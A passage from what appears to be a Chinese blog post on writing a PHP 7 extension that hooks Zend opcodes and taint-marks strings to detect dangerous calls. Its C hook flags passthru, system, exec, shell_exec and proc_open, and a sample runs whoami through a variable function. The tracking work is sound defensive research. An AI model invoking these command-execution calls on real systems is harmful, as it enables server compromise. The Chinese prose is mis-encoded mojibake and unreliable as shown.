‡è®°çš„ï¼Œè¿™ä¸ªæ—¶å€™é€šè¿‡å¤„ç†<code>CONCAT</code>æŒ‡ä»¤å³å¯è§£å†³ï¼š<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846062338354.jpg" alt="-w775"></p><h4 id="Demo-Hook-ZEND-ECHO"><a href="#Demo-Hook-ZEND-ECHO" class="headerlink" title="Demo: Hook ZEND_ECHO"></a>Demo: Hook ZEND_ECHO</h4><p>åŸºç¡€ï¼Œphpæ‰§è¡Œæµç¨‹ã€å…¨å±€å˜é‡ç­‰</p><p>è¿™ç§æ–¹å¼è¦æ±‚æˆ‘ä»¬çŸ¥é“å‡½æ•°æ‰€å¯¹åº”çš„opcodeä»£ç ï¼Œå¯ä»¥é€šè¿‡gdbè°ƒè¯•çš„åŠæ³•æŸ¥æ‰¾ï¼Œè¿™é‡Œä»¥echoä¸ºä¾‹ï¼Œå…¶opcodeä¸º<code>ZEND_ECHO</code>ã€‚<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846062338363.jpg" alt="-w683"></p><p>åœ¨<code>passer6y.h</code>ä¸­æ·»åŠ å®šä¹‰:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int fake_echo(ZEND_OPCODE_HANDLER_ARGS);</span><br></pre></td></tr></table></figure></p><p>ç„¶ååœ¨<code>passer6y.c</code>ä¸­æ·»åŠ <br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">int fake_echo(ZEND_OPCODE_HANDLER_ARGS)</span><br><span class="line">&#123;</span><br><span class="line">    php_printf(&quot;hook success&quot;);</span><br><span class="line">return ZEND_USER_OPCODE_RETURN;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>å¹¶åœ¨æ¨¡å—åˆå§‹åŒ–<code>PHP_MINIT_FUNCTION</code>å‡½æ•°ä¸­æ·»åŠ è°ƒç”¨ï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">PHP_MINIT_FUNCTION(passer6y)</span><br><span class="line">&#123;</span><br><span class="line">/* If you have INI entries, uncomment these lines</span><br><span class="line">REGISTER_INI_ENTRIES();</span><br><span class="line">*/</span><br><span class="line">//php_override_func(&quot;echo&quot;, sizeof(&quot;echo&quot;), PHP_FN(fake_echo), NULL TSRMLS_CC);</span><br><span class="line">zend_set_user_opcode_handler(ZEND_ECHO, fake_echo);</span><br><span class="line">return SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>ç¼–è¯‘è¿è¡Œï¼š<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846062338371.jpg" alt="-w873"></p><h4 id="æ•æ„Ÿå‡½æ•°hook"><a href="#æ•æ„Ÿå‡½æ•°hook" class="headerlink" title="æ•æ„Ÿå‡½æ•°hook"></a>æ•æ„Ÿå‡½æ•°hook</h4><ul><li>eval: INCLUDE_OR_EVAL<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846062338379.jpg" alt="-w691"><br>åœ¨<code>php-src-php-7.0.33/Zend/zend_ast.c#1258</code>è¿˜æœ‰å…¶ä»–å‡ ä¸ªä¹Ÿä½¿ç”¨äº†ç›¸åŒçš„opcode:</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> ZEND_AST_INCLUDE_OR_EVAL:</span><br><span class="line"><span class="keyword">switch</span> (ast-&gt;attr) &#123;</span><br><span class="line"><span class="keyword">case</span> ZEND_INCLUDE_ONCE: FUNC_OP(<span class="string">"include_once"</span>);</span><br><span class="line"><span class="keyword">case</span> ZEND_INCLUDE:      FUNC_OP(<span class="string">"include"</span>);</span><br><span class="line"><span class="keyword">case</span> ZEND_REQUIRE_ONCE: FUNC_OP(<span class="string">"require_once"</span>);</span><br><span class="line"><span class="keyword">case</span> ZEND_REQUIRE:      FUNC_OP(<span class="string">"require"</span>);</span><br><span class="line"><span class="keyword">case</span> ZEND_EVAL:         FUNC_OP(<span class="string">"eval"</span>);</span><br><span class="line">EMPTY_SWITCH_DEFAULT_CASE();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><p>æ˜¾ç„¶ï¼Œ<code>include_once</code>ã€<code>include</code>ã€<code>require_once</code>ã€<code>require</code>ã€<code>eval</code>è¿™5ä¸ªå‡½æ•°çš„åŠŸèƒ½ä¸€æ ·ã€‚</p><ul><li>system: DO_ICALL<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846062338387.jpg" alt="-w733"></li></ul><ul><li>å˜é‡å‡½æ•°æ‰§è¡Œï¼šDO_FCALL<br><code>$a=&quot;system&quot;;$a(&quot;whoami&quot;);</code><br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846062338394.jpg" alt="-w755"></li></ul><p>æ€»ç»“ä¸€ä¸‹ï¼Œhookè¿™å‡ ä¸ªopcodeæŒ‡ä»¤ï¼š</p><ul><li>INCLUDE_OR_EVAL</li><li>DO_ICALL</li><li>DO_FCALL</li></ul><h5 id="å…·ä½“å®ç°"><a href="#å…·ä½“å®ç°" class="headerlink" title="å…·ä½“å®ç°"></a>å…·ä½“å®ç°</h5><p><strong>opcode hook</strong><br>é€šè¿‡<code>zend_set_user_opcode_handler(zend_uchar opcode, user_opcode_handler_t handler)</code>å‡½æ•°å®ç°å°†æŒ‡å®šçš„opcodeï¼Œæ›¿æ¢æˆæˆ‘ä»¬è‡ªå®šä¹‰çš„ã€‚</p><p>å…¶ä¸­<code>user_opcode_handler_t</code>ç±»å‹æ˜¯<code>zend_execute_data *execute_data</code>çš„åˆ«åï¼š<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846062338401.jpg" alt="-w1226"></p><blockquote><p>ç¬¬ä¸€æ¬¡è§typedefçš„è¿™ç§ç”¨æ³•ï¼Œå‚è€ƒè¿™ç¯‡æ–‡ç« ï¼š<a href="https://c.biancheng.net/view/298.html" target="_blank" rel="noopener">https://c.biancheng.net/view/298.html</a></p></blockquote><p><code>zend_execute_data</code>ç»“æ„çš„æ³¨è§£åœ¨æ–‡æ¡£ä¸­æœ‰è§£é‡Šï¼š<a href="https://www.kancloud.cn/nickbai/php7/363280" target="_blank" rel="noopener">https://www.kancloud.cn/nickbai/php7/363280</a><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EX(element)             ((execute_data)-&gt;element)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//zend_compile.h</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">zend_execute_data</span> &#123;</span></span><br><span class="line">    <span class="keyword">const</span> zend_op       *opline;  <span class="comment">//æŒ‡å‘å½“å‰æ‰§è¡Œçš„opcodeï¼Œåˆå§‹æ—¶æŒ‡å‘zend_op_arrayèµ·å§‹ä½ç½®</span></span><br><span class="line">    zend_execute_data   *call;             <span class="comment">/* current call                   */</span></span><br><span class="line">    zval                *return_value;  <span class="comment">//è¿”å›å€¼æŒ‡é’ˆ</span></span><br><span class="line">    zend_function       *func;          <span class="comment">//å½“å‰æ‰§è¡Œçš„å‡½æ•°ï¼ˆéå‡½æ•°è°ƒç”¨æ—¶ä¸ºç©ºï¼‰</span></span><br><span class="line">    zval                 This;          <span class="comment">//è¿™ä¸ªå€¼å¹¶ä¸ä»…ä»…æ˜¯é¢å‘å¯¹è±¡çš„thisï¼Œè¿˜æœ‰å¦å¤–ä¸¤ä¸ªå€¼ä¹Ÿé€šè¿‡è¿™ä¸ªè®°å½•ï¼šcall_info + num_argsï¼Œåˆ†åˆ«å­˜åœ¨zval.u1.reservedã€zval.u2.num_args</span></span><br><span class="line">    zend_class_entry    *called_scope;  <span class="comment">//å½“å‰callçš„ç±»</span></span><br><span class="line">    zend_execute_data   *prev_execute_data; <span class="comment">//å‡½æ•°è°ƒç”¨æ—¶æŒ‡å‘è°ƒç”¨ä½ç½®ä½œç”¨ç©ºé—´</span></span><br><span class="line">    zend_array          *symbol_table; <span class="comment">//å…¨å±€å˜é‡ç¬¦å·è¡¨</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> ZEND_EX_USE_RUN_TIME_CACHE</span></span><br><span class="line">    <span class="keyword">void</span>               **run_time_cache;   <span class="comment">/* cache op_array-&gt;run_time_cache */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> ZEND_EX_USE_LITERALS</span></span><br><span class="line">    zval                *literals;  <span class="comment">//å­—é¢é‡æ•°ç»„ï¼Œä¸func.op_array-&gt;literalsç›¸åŒ</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p>å…¶ä¸­ç¬¬ä¸€ä¸ªè½¦ç®¡å‘˜<code>opline</code>çš„ç»“æ„å®šä¹‰ï¼š<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">zend_op</span> &#123;</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">void</span> *handler; <span class="comment">//å¯¹åº”æ‰§è¡Œçš„Cè¯­è¨€functionï¼Œå³æ¯æ¡opcodeéƒ½æœ‰ä¸€ä¸ªC functionå¤„ç†</span></span><br><span class="line">    znode_op op1;   <span class="comment">//æ“ä½œæ•°1</span></span><br><span class="line">    znode_op op2;   <span class="comment">//æ“ä½œæ•°2</span></span><br><span class="line">    znode_op result; <span class="comment">//è¿”å›å€¼</span></span><br><span class="line">    <span class="keyword">uint32_t</span> extended_value; </span><br><span class="line">    <span class="keyword">uint32_t</span> lineno; </span><br><span class="line">    zend_uchar opcode;  <span class="comment">//opcodeæŒ‡ä»¤</span></span><br><span class="line">    zend_uchar op1_type; <span class="comment">//æ“ä½œæ•°1ç±»å‹</span></span><br><span class="line">    zend_uchar op2_type; <span class="comment">//æ“ä½œæ•°2ç±»å‹</span></span><br><span class="line">    zend_uchar result_type; <span class="comment">//è¿”å›å€¼ç±»å‹</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p>è¿˜æœ‰æˆå‘˜<code>func</code>çš„å®šä¹‰ï¼š<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> _zend_function &#123;</span><br><span class="line">    zend_uchar type;    <span class="comment">/* MUST be the first element of this struct! */</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">        zend_uchar type;  <span class="comment">/* never used */</span></span><br><span class="line">        zend_uchar arg_flags[<span class="number">3</span>]; <span class="comment">/* bitset of arg_info.pass_by_reference */</span></span><br><span class="line">        <span class="keyword">uint32_t</span> fn_flags;</span><br><span class="line">        zend_string *function_name;</span><br><span class="line">        zend_class_entry *scope; <span class="comment">//æˆå‘˜æ–¹æ³•æ‰€å±ç±»ï¼Œé¢å‘å¯¹è±¡å®ç°ä¸­ç”¨åˆ°</span></span><br><span class="line">        <span class="keyword">union</span> _zend_function *prototype;</span><br><span class="line">        <span class="keyword">uint32_t</span> num_args; <span class="comment">//å‚æ•°æ•°é‡</span></span><br><span class="line">        <span class="keyword">uint32_t</span> required_num_args; <span class="comment">//å¿…ä¼ å‚æ•°æ•°é‡</span></span><br><span class="line">        zend_arg_info *arg_info; <span class="comment">//å‚æ•°ä¿¡æ¯</span></span><br><span class="line">    &#125; common;</span><br><span class="line"></span><br><span class="line">    zend_op_array op_array; <span class="comment">//å‡½æ•°å®é™…ç¼–è¯‘ä¸ºæ™®é€šçš„zend_op_array</span></span><br><span class="line">    zend_internal_function internal_function;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p>ç°åœ¨æˆ‘ä»¬è¦å®ç°ä¸€ä¸ªæ‰§è¡Œè¯¥opcodeçš„å‡½æ•°ä»¥åŠå‚æ•°çš„åŠŸèƒ½ï¼š<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">php_do_fcall_handler</span><span class="params">(zend_execute_data *execute_data)</span></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> zend_op *opline = execute_data-&gt;opline;    </span><br><span class="line">zend_execute_data *call = execute_data-&gt;call;</span><br><span class="line">zend_function *fbc = call-&gt;func;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (fbc-&gt;type == ZEND_INTERNAL_FUNCTION) &#123;</span><br><span class="line"><span class="comment">// è·å–å‚æ•°ä¸ªæ•°</span></span><br><span class="line"><span class="keyword">int</span> arg_count = ZEND_CALL_NUM_ARGS(call); </span><br><span class="line"><span class="keyword">if</span> (!arg_count) &#123;</span><br><span class="line"><span class="keyword">return</span> ZEND_USER_OPCODE_DISPATCH;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å¦‚æœä¸åœ¨ç±»ä¸­</span></span><br><span class="line"><span class="keyword">if</span> (fbc-&gt;common.scope == <span class="literal">NULL</span>)&#123;</span><br><span class="line">zend_string *fname = fbc-&gt;common.function_name;</span><br><span class="line"><span class="keyword">char</span> *funcname = ZSTR_VAL(fname);</span><br><span class="line"><span class="keyword">int</span> len = <span class="built_in">strlen</span>(funcname);</span><br><span class="line"><span class="keyword">if</span> (fname) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">strncmp</span>(<span class="string">"passthru"</span>, funcname, len) == <span class="number">0</span></span><br><span class="line">|| <span class="built_in">strncmp</span>(<span class="string">"system"</span>, funcname, len) == <span class="number">0</span></span><br><span class="line">|| <span class="built_in">strncmp</span>(<span class="string">"exec"</span>, funcname, len) == <span class="number">0</span></span><br><span class="line">|| <span class="built_in">strncmp</span>(<span class="string">"shell_exec"</span>, funcname, len) == <span class="number">0</span></span><br><span class="line">|| <span class="built_in">strncmp</span>(<span class="string">"proc_open"</span>, funcname, len) == <span class="number">0</span> ) &#123;</span><br><span class="line">zend_error(E_WARNING, funcname);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">zend_error(E_WARNING, <span class="string">"ZEND_DO_FCALL Hook success"</span>);</span><br><span class="line">    <span class="keyword">return</span> ZEND_USER_OPCODE_DISPATCH;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846062338409.jpg" alt="-w669"></p><p><strong>å‡½æ•°å‚æ•°è·å–</strong><br>å‚è€ƒ<a href="https://www.kancloud.cn/nickbai/php7/363323" target="_blank" rel="noopener">php7å†…æ ¸å‰–æ</a>æ–‡ç« çš„å‡½æ•°å‚æ•°è§£æéƒ¨åˆ†ï¼Œè·å–åˆ°ç¬¬ä¸€ä¸ªå‚æ•°ï¼š<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">php_do_fcall_handler</span><span class="params">(zend_execute_data *execute_data)</span></span>&#123;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">zend_execute_data *call = execute_data-&gt;call;</span><br><span class="line">zval *arg = ZEND_CALL_ARG(call, <span class="number">1</span>);</span><br></pre></td></tr></table></figure></p><p><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846062338417.jpg" alt="-w658"></p><p><strong>æ ¼å¼åŒ–è¾“å‡º</strong><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">php_warning</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *fname, <span class="keyword">const</span> <span class="keyword">char</span> *arg, <span class="keyword">const</span> <span class="keyword">char</span> *format, ...)</span> <span class="comment">/* &#123;&#123;&#123; */</span> </span>&#123;</span><br><span class="line"><span class="keyword">char</span> *buffer, *msg;</span><br><span class="line">va_list args;</span><br><span class="line"><span class="comment">//EG(error_reporting) = 1;</span></span><br><span class="line">va_start(args, format);</span><br><span class="line">vspprintf(&amp;buffer, <span class="number">0</span>, format, args);</span><br><span class="line">spprintf(&amp;msg, <span class="number">0</span>, <span class="string">"%s(\"%s\"): %s"</span>, fname, arg, buffer);</span><br><span class="line">efree(buffer);</span><br><span class="line">zend_error(E_WARNING, msg);</span><br><span class="line">efree(msg);</span><br><span class="line">va_end(args);</span><br><span class="line">&#125; <span class="comment">/* &#125;&#125;&#125; */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//... php_do_fcall_handler()</span></span><br><span class="line">php_warning(funcname, ZSTR_VAL(Z_STR_P(arg)), <span class="string">"warning function"</span>);</span><br></pre></td></tr></table></figure></p><p><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846062338425.jpg" alt="-w677"></p><p>æ¥ä¸‹æ¥å†™ä¸€ä¸ªå¾ªç¯éå†ï¼Œè·å–å…¨éƒ¨å‚æ•°ï¼š<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// åˆ›å»ºä¸€ä¸ªæ•°ç»„ï¼Œè®°å½•å‚æ•°</span></span><br><span class="line">ZVAL_NEW_ARR(&amp;z_params);    </span><br><span class="line">zend_hash_init(Z_ARRVAL(z_params), arg_count, <span class="literal">NULL</span>, ZVAL_PTR_DTOR, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;arg_count; i++) &#123;</span><br><span class="line">zval *p = ZEND_CALL_ARG(call, i + <span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span> (Z_REFCOUNTED_P(p)) Z_ADDREF_P(p);</span><br><span class="line">zend_hash_next_index_insert(Z_ARRVAL(z_params), p);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><blockquote><p>å‰©ä¸‹å‡ ä¸ªopcodeæŒ–å‘</p></blockquote><h2 id="æ±¡ç‚¹æ ‡è®°"><a href="#æ±¡ç‚¹æ ‡è®°" class="headerlink" title="æ±¡ç‚¹æ ‡è®°"></a>æ±¡ç‚¹æ ‡è®°</h2><p>ç»§ç»­å‚è€ƒfate0å¸ˆå‚…çš„<a href="https://github.com/fate0/xmark" target="_blank" rel="noopener">xmark</a>é¡¹ç›®ï¼Œåœ¨æ‰©å±•ä¸­é€šè¿‡<code>PHP_FUNCTION</code>æ¥å®šä¹‰<code>xmark</code>å‡½æ•°ï¼Œå¸®åŠ©æˆ‘ä»¬æ ‡è®°å­—ç¬¦ä¸²ï¼Œä¼ é€’ä¸€ä¸ªå­—ç¬¦ä¸²å¼•ç”¨ï¼Œè¿”å›æ˜¯å¦æ ‡è®°æˆåŠŸã€‚<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">PHP_FUNCTION(xmark)</span><br><span class="line">&#123;</span><br><span class="line">    zval *z_str;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!XMARK_G(enable)) &#123;</span><br><span class="line">        RETURN_FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// è·å–å‚æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°ä¸ºæ¥æ”¶å‚æ•°çš„ä¸ªæ•°ï¼ŒZEND_NUM_ARGS()ä¸ºæœ‰å¤šå°‘è¦å¤šå°‘ï¼Œzä¸ºzvalç±»å‹ï¼Œå¼•ç”¨ä¼ å‚é€šè¿‡zend_parse_parametersåªèƒ½ç”¨zï¼Œç¬¬ä¸‰ä¸ªä¸ºå­˜å‚¨å‚æ•°å˜é‡çš„æŒ‡é’ˆ</span></span><br><span class="line">    <span class="keyword">if</span> (zend_parse_parameters(ZEND_NUM_ARGS(), <span class="string">"z"</span>, &amp;z_str) == FAILURE) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ZVAL_DEREF(z_str);     <span class="comment">// åœ¨php-src-php-7.0.33/Zend/zend_types.hä¸­å®šä¹‰ï¼Œå¦‚æœz_stræ˜¯å¼•ç”¨åˆ™æ‰¾åˆ°å…¶å…·ä½“å¼•ç”¨çš„zval</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">// åªèƒ½æ ‡è®°å­—ç¬¦ä¸²ï¼Œæ‰€ä»¥arrayå’Œå…¶ä»–ç±»å‹å¾—å…ˆéå†ä¸€ä¸‹</span></span><br><span class="line">    <span class="keyword">if</span> (IS_STRING != Z_TYPE_P(z_str) || Z_STRLEN_P(z_str) == <span class="number">0</span>) &#123;</span><br><span class="line">        RETURN_FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (xmark_zstr(z_str) == FAILURE) &#123;</span><br><span class="line">        RETURN_FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    RETURN_TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>å…¶ä¸­æ ‡è®°å­—ç¬¦éƒ¨åˆ†åœ¨<code>xmark_zstr</code>å‡½æ•°ä¸­å¤„ç†ï¼š<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> zend_always_inline <span class="keyword">int</span> <span class="title">xmark_zstr</span><span class="params">(zval *z_str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!XCHECK_FLAG(Z_STR_P(z_str))) &#123;</span><br><span class="line">        zend_string *str = zend_string_init(Z_STRVAL_P(z_str), Z_STRLEN_P(z_str), <span class="number">0</span>);</span><br><span class="line">        ZSTR_LEN(str) = Z_STRLEN_P(z_str);</span><br><span class="line">        zend_string_release(Z_STR_P(z_str));    <span class="comment">// é‡Šæ”¾z_strå­—ç¬¦ä¸²</span></span><br><span class="line">        XMARK_FLAG(str);        <span class="comment">// æ ‡è®°å­—ç¬¦ä¸²</span></span><br><span class="line">        ZVAL_STR(z_str, str);       <span class="comment">// æ ‡è®°å®Œäº†åï¼Œå°†z_strçš„å€¼è®¾ä¸ºstr</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>åœ¨å…·ä½“çš„<code>XMARK_FLAG</code>å’Œ<code>XCHECK_FLAG</code>å‡½æ•°è¿™æ ·å®ç°çš„ï¼Œxmark/php_xmark.h#41<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">if</span> PHP_VERSION_ID &lt; 70300</span></span><br><span class="line"><span class="meta">#   <span class="meta-keyword">define</span> IS_XMARK_FLAG            (1&lt;&lt;6)</span></span><br><span class="line"><span class="meta">#   <span class="meta-keyword">define</span> XMARK_FLAG(str)          (GC_FLAGS((str)) |= IS_XMARK_FLAG)</span></span><br><span class="line"><span class="meta">#   <span class="meta-keyword">define</span> XCLEAR_FLAG(str)         (GC_FLAGS((str)) &amp;= ~IS_XMARK_FLAG)</span></span><br><span class="line"><span class="meta">#   <span class="meta-keyword">define</span> XCHECK_FLAG(str)         (GC_FLAGS((str)) &amp; IS_XMARK_FLAG)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="meta">#   <span class="meta-keyword">define</span> EX_CONSTANT(op)          RT_CONSTANT(EX(opline), op)</span></span><br><span class="line"><span class="meta">#   <span class="meta-keyword">define</span> IS_XMARK_FLAG            (1&lt;&lt;5)</span></span><br><span class="line"><span class="meta">#   <span class="meta-keyword">define</span> XMARK_FLAG(str)          GC_ADD_FLAGS(str, IS_XMARK_FLAG)</span></span><br><span class="line"><span class="meta">#   <span class="meta-keyword">define</span> XCLEAR_FLAG(str)         GC_DEL_FLAGS(str, IS_XMARK_FLAG)</span></span><br><span class="line"><span class="meta">#   <span class="meta-keyword">define</span> XCHECK_FLAG(str)         (GC_FLAGS((str)) &amp; IS_XMARK_FLAG)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure></p><p>å…ˆåˆ¤æ–­phpç‰ˆæœ¬ï¼Œ7.0.3ä¸ºåˆ†ç•Œçº¿ï¼Œæˆ‘è¿™é‡Œæ˜¯7.0.33ï¼Œé€šè¿‡å®å®šä¹‰å®ç°æ ‡è®°ã€æ¸…é™¤ã€æ£€æµ‹flagçš„åŠŸèƒ½ï¼Œå…¶ä¸­<code>GC_FLAGS</code>å‡½æ•°ä¸ºphpå†…æ ¸ä¸­<code>php-src-php-7.0.33/Zend/zend_types.h</code>çš„å®å®šä¹‰ï¼Œå€ŸåŠ©äº†åƒåœ¾å›æ”¶ç»“æ„çš„<code>gc.u.v.flags</code>å­—æ®µçš„æœªè¢«ä½¿ç”¨çš„æ ‡è®°ä½æ¥è®°å½•æ˜¯å¦è¢«æ±¡æŸ“ï¼š<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846062338433.jpg" alt="-w747"><br>è€Œåœ¨æ¸…é™¤æ ‡è®°ã€æ£€æµ‹æ ‡è®°çš„å®ç°ä¸­æ€è·¯ä¹Ÿå’Œè¿™ä¸ªç±»ä¼¼ï¼Œé€šè¿‡<code>xmark/php_xmark.h</code>çš„å®è¿›è¡Œè¿ç®—ã€‚</p><h2 id="å¨èƒåˆ¤æ–­"><a href="#å¨èƒåˆ¤æ–­" class="headerlink" 